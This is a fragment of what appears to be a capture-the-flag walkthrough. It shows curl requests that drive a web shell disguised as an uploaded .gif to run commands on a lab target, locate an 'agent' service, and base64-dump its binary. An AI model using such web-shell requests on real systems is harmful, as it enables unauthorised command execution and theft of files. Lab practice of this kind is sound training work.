...
curl http://192.168.1.20/imfadministrator/uploads/c59ca80d5d76.gif?c=find%20/%20-name%20%22(asterisk)agent%22

Which found:
/etc/xinetd.d/agent

curl http://192.168.1.20/imfadministrator/uploads/c59ca80d5d76.gif?c=cat%20/etc/xinetd.d/agent
...
curl -v http://192.168.0.14/imfadministrator/uploads/c59ca80d5d76.gif?c=ls%20-latr%20/usr/local/bin/agent
...
curl -v http://192.168.0.14/imfadministrator/uploads/c59ca80d5d76.gif?c=base64%20-w%200%20/usr/local/bin/agent
